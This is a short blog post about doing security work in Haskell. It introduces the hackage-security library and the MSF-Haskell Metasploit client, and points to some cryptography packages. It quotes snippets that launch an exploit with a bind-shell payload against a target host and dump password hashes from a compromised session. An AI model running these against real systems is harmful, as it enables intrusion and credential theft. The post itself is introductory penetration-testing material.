---
layout: post
title: Security with Haskell
author: terceranexus6
image:
  feature: banners/header.jpg
tags: security haskell functional
---

From "*you are crazy*" to "*why even?*" are some of the things my friends in the computer science environment have told me when I started working with Haskell in general and security in particular. Answering in order, yes I'm crazy but not because of Haskell and well, there's a reason why I chose to use Haskell for security. First of all, functional programming *is the new black* and probably more and more apps will be build using it. Choosing a pure functional language for security is not that crazy. On the other hand, the mathematical approaching Haskell has is very useful in cryptography.

<img src="{{ site.url }}/assets/images/dev.to/tumblr_lpkxtmFtmp1qc8ie7o1_500.gif" style="display: block; margin: 0 auto;">

So, how can I use Haskell for auditoring security?

I'd like to point here to an specific library called [hackage-security](https://hackage.haskell.org/package/hackage-security) which, currently supports only index signing. As described in the wiki, *The library has two main entry points: [Hackage.Security.Client](https://hackage.haskell.org/package/hackage-security-0.5.3.0/docs/Hackage-Security-Client.html) is the main entry point for clients, and [Hackage.Security.Server](https://hackage.haskell.org/package/hackage-security-0.5.3.0/docs/Hackage-Security-Server.html) is the main entry point for servers*. It is worth a check.

Apart from this, there's also a repository in github called [MSF-Haskell](https://github.com/GaloisInc/msf-haskell) that allows performing Penetration testing with haskell. It also includes a script in haskell as an example, and the whole whitepaper, too. It's actually an implementation of the Metasploit API which makes developers able to write Haskell clients that communicate with the Metasploit server. For example, in the part of the example script, launches an example exploit against a target host.

```
launchExploit :: (LoudCxt s) => Host Attackable -> MSF s ()
launchExploit targetHost = do
  _ <- module_execute metasploitableModuleType metasploitableModuleName
      $ toObject
      $ Map.fromList
          [ ("RHOST",   toObject targetHost)
          , ("PAYLOAD", toObject metasploitablePayload)
          ]
  return ()
```

And we previously defined the payload itself:

```
metasploitablePayload = Payload "cmd/unix/bind_perl"
```

Or this part for grabbing password hashes:

```
gatherCredentials :: (LoudCxt s) => SessionId -> MSF s ()
gatherCredentials sessionId = do
  let modTyp = PostModuleType
      modNm = ModuleName "linux/gather/hashdump"

  r <- module_execute modTyp modNm
      $ toObject
      $ Map.fromList
          [ ("SESSION",   toObject sessionId)
          ]
  case r of
    (ExecJobId j) -> waitJob j
    _             -> return ()
```

To sum up, Haskell `could` be an option for `functional` scripting in security. `[Maybe](https://wiki.haskell.org/Maybe)` good_option, you know, just an option or nothing, haha functional joke, badum tss.

<img src="{{ site.url }}/assets/images/dev.to/Ba-dum-tish.png" style="display: block; margin: 0 auto;">

Anyway these are brand new type of attacks! even from a scratch, and not using API's implementations such as before described. Speaking about crypto, this [repo](https://github.com/mfourne/eccrypto.git) is interesting, as it handles elliptic curves encryption. Welp, I invite you all to take a look to [cryptography repos](https://hackage.haskell.org/packages/search?terms=cryptography) in the official Haskell web, as well as the security [repos](https://hackage.haskell.org/packages/search?terms=security). I'm still investigating, so if anyone is working on the same field here, please provide more info!

*Also written in: [https://dev.to/terceranexus6/security-with-haskell-3cio](https://dev.to/terceranexus6/security-with-haskell-3cio)*
